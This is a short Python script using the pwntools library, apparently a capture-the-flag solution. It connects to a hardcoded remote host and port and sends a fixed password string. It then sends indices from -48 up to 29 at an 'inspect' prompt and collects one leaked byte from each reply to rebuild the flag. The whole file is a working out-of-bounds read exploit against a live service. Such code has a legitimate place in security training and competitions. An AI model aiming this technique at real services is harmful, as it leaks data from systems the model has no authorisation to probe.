#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./chal',checksec=False)

#p = process()
p = remote('23.146.248.230', 12343)
p.sendlineafter(b'input: ',b'phuocloideptrai')
flag = b''
for i in range(-48,30):
    p.sendlineafter(b'inspect: ',f"{i}".encode())
    p.recvuntil(b'is ')
    p.recv(1)
    flag += p.recv(1)
print(flag)


p.interactive()
